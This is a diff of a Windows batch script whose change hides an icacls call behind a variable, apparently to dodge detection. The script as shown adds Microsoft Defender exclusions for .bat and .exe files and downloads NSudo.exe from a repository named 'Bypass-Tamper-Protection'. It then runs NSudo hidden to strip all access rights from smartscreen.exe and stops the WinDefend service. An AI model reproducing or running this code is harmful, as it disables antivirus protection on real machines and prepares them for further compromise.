@@ -32,6 +32,8 @@ set sparrow=System32
 
 set hande-cuty=smartscreen.exe
 
+set y=icacls
+
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
@@ -74,7 +76,7 @@ cd  %temp%
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe', '.\NSudo.exe') }
 
 
-NSudo.exe -U:T -ShowWindowMode:Hide icacls "%jack%\%sparrow%\%hande-cuty%" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+NSudo.exe -U:T -ShowWindowMode:Hide %y% "%jack%\%sparrow%\%hande-cuty%" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
  
 NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 
 
